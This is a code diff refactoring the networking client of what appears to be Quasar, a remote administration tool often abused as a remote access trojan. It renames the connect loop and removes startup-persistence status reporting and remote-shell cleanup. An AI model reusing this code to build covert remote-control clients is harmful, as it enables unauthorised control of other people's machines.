@@ -1,9 +1,6 @@
-﻿using Quasar.Client.Commands;
-using Quasar.Client.Config;
-using Quasar.Client.Data;
-using Quasar.Client.IpGeoLocation;
+﻿using Quasar.Client.Config;
 using Quasar.Client.Helper;
-using Quasar.Client.Utilities;
+using Quasar.Client.IpGeoLocation;
 using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
 using Quasar.Common.Utilities;
@@ -12,6 +9,7 @@ using System.Diagnostics;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Common.DNS;
 
 namespace Quasar.Client.Networking
 {
@@ -20,7 +18,7 @@ namespace Quasar.Client.Networking
         /// <summary>
         /// When Exiting is true, stop all running threads and exit.
         /// </summary>
-        public static bool Exiting { get; private set; }
+        public bool Exiting { get; private set; }
         public bool Identified { get; private set; }
         private readonly HostsManager _hosts;
         private readonly SafeRandom _random;
@@ -35,9 +33,8 @@ namespace Quasar.Client.Networking
             base.ClientFail += OnClientFail;
         }
 
-        public void Connect()
+        public void ConnectLoop()
         {
-            // TODO: move connect loop to QuasarApplication
             // TODO: do not re-use object
             while (!Exiting) // Main Connect Loop
             {
@@ -83,7 +80,6 @@ namespace Quasar.Client.Networking
             }
 
             MessageHandler.Process(client, message);
-            PacketHandler.HandlePacket(client, message);
         }
 
         private void OnClientFail(Client client, Exception ex)
@@ -117,24 +113,7 @@ namespace Quasar.Client.Networking
                     EncryptionKey = Settings.ENCRYPTIONKEY,
                     Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
                 });
-
-                if (ClientData.AddToStartupFailed)
-                {
-                    Thread.Sleep(2000);
-                    client.Send(new SetStatus
-                    {
-                        Message = "Adding to startup failed."
-                    });
-                }
             }
-
-            if (!connected && !Exiting)
-                LostConnection();
-        }
-
-        private void LostConnection()
-        {
-            CommandHandler.CloseShell();
         }
 
         public void Exit()
